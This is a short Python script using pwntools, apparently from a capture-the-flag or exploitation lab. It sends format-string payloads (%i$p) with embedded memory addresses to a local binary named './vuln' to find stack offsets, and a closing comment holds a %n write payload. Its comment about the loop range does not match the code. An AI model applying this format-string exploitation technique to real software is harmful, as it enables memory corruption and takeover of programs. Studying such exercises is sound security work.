from pwn import *

# Loop through format string positions from 0 to 100
for i in range(20):
    # Start a new process for each iteration
    p = process('./vuln')

    # Construct the format string payload with the current index
    payload = f"\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00%{i}$p"

    # Send the payload to the program
    p.sendline(payload)

    # Receive and print the output
    output = p.recvall(timeout=1)
    print(f"Output for %{i}$p: {output.decode()}")

    # Close the process after the interaction
    p.close()

#\x60\x40\x40\x00\x00\x00\x00\x00%{i}$n
